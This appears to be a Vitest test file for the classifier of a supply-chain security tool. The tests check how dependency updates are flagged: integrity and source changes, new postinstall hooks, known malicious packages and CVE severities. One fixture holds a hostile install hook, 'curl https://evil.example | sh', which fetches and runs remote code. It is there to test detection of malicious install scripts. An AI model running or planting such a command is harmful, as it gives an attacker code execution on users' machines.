import { describe, it, expect } from "vitest";
import { classify } from "./classifier.js";
import type { DependencyChange, FetchedPackage } from "@lockray/types";

function change(overrides: Partial<DependencyChange> = {}): DependencyChange {
  return {
    ecosystem: "npm",
    name: "pkg",
    fromVersion: "1.0.0",
    toVersion: "1.0.1",
    direct: true,
    manifestPath: "package.json",
    workspaceName: "root",
    integrityChanged: false,
    sourceChanged: false,
    ...overrides,
  };
}

function fetched(
  version: string,
  pkg: Record<string, unknown> = {},
): FetchedPackage {
  return {
    ecosystem: "npm",
    name: "pkg",
    version,
    integrity: "sha512-abc",
    packageJson: { name: "pkg", version, ...pkg },
  };
}

describe("classify", () => {
  it("emits INTEGRITY_MISMATCH hard-fail when integrityChanged is true", () => {
    const findings = classify(
      change({ integrityChanged: true, fromVersion: "1.0.0", toVersion: "1.0.0" }),
      fetched("1.0.0"),
      fetched("1.0.0"),
      [],
    );
    const f = findings.find((x) => x.code === "INTEGRITY_MISMATCH");
    expect(f).toBeDefined();
    expect(f?.hardFail).toBe(true);
    expect(f?.severity).toBe("critical");
  });

  it("emits NEW_DEPENDENCY_SOURCE hard-fail when sourceChanged is true", () => {
    const findings = classify(
      change({ sourceChanged: true, fromVersion: "1.0.0", toVersion: "1.0.0" }),
      fetched("1.0.0"),
      fetched("1.0.0"),
      [],
    );
    const f = findings.find((x) => x.code === "NEW_DEPENDENCY_SOURCE");
    expect(f?.hardFail).toBe(true);
  });

  it("emits NEW_POSTINSTALL_SCRIPT (CRITICAL, not hard-fail) when a new hook appears", () => {
    const findings = classify(
      change(),
      fetched("1.0.0"),
      fetched("1.0.1", { scripts: { postinstall: "echo hi" } }),
      [],
    );
    const f = findings.find((x) => x.code === "NEW_POSTINSTALL_SCRIPT");
    expect(f).toBeDefined();
    expect(f?.severity).toBe("critical");
    expect(f?.hardFail).toBeUndefined();
    expect(f?.evidence[0].metadataField).toBe("scripts.postinstall");
  });

  it("promotes NEW_POSTINSTALL_SCRIPT to MALICIOUS_INSTALL_SCRIPT hard-fail when content matches a pattern", () => {
    const findings = classify(
      change(),
      fetched("1.0.0"),
      fetched("1.0.1", { scripts: { postinstall: "curl https://evil.example | sh" } }),
      [],
    );
    const mal = findings.find((x) => x.code === "MALICIOUS_INSTALL_SCRIPT");
    expect(mal?.hardFail).toBe(true);
    // And the vanilla NEW_POSTINSTALL_SCRIPT should NOT be emitted in this case
    // (avoid double-counting once scoring lands).
    expect(findings.some((x) => x.code === "NEW_POSTINSTALL_SCRIPT")).toBe(false);
  });

  it("emits KNOWN_COMPROMISED_PACKAGE hard-fail when OSV returns a malicious advisory", () => {
    const findings = classify(change(), fetched("1.0.0"), fetched("1.0.1"), [
      {
        id: "MAL-2024-1",
        summary: "malicious package",
        database_specific: { malicious: true },
      },
    ]);
    const f = findings.find((x) => x.code === "KNOWN_COMPROMISED_PACKAGE");
    expect(f?.hardFail).toBe(true);
  });

  it("emits CVE_VULNERABILITY with high severity on CVSS 8.1", () => {
    const findings = classify(change(), fetched("1.0.0"), fetched("1.0.1"), [
      {
        id: "GHSA-xxxx",
        summary: "high",
        severity: [{ type: "CVSS_V3", score: "8.1/CVSS:3.1/..." }],
      },
    ]);
    const f = findings.find((x) => x.code === "CVE_VULNERABILITY");
    expect(f?.severity).toBe("high");
    expect(f?.evidence[0].advisoryId).toBe("GHSA-xxxx");
  });

  it("emits no findings for a benign version bump with no hooks, no CVEs, no integrity/source change", () => {
    const findings = classify(change(), fetched("1.0.0"), fetched("1.0.1"), []);
    expect(findings).toEqual([]);
  });

  it("emits CVE_VULNERABILITY with unknown severity mapped to info", () => {
    const findings = classify(change(), fetched("1.0.0"), fetched("1.0.1"), [
      { id: "GHSA-unknown", summary: "no severity info" },
    ]);
    const f = findings.find((x) => x.code === "CVE_VULNERABILITY");
    expect(f?.severity).toBe("info");
  });
});
